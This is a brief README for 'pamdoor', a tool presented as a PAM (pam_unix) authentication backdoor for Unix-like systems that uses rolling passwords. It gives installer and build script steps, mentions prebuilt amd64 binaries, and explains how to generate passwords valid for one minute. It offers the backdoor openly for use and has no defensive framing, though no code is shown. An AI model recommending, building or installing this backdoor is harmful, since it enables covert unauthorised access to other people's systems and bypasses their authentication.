# pamdoor
PAM Backdoor with rolling passwords for NIX-based systems

(not so) simple yet powerful pam_unix backdoor for NIX-like systems. 

*patch* is required to build, installer is written in bash and requires absouletly nothing except .so binary.

release includes binaries and installer for amd64 architecture.
# usage:
*chmod +x ./installbackdoor.sh* and run it. to build use *./buildbackdoor.sh*

compile and run *backdoorpass* for password generation. passwords are valid only for a minute, so you gotta be quick. 

in most cases it will determine PAM version automatically, but if it fails, you can use -n flag to disable autodetection.

this backdoor is still an early beta in terms of user-friendliness.
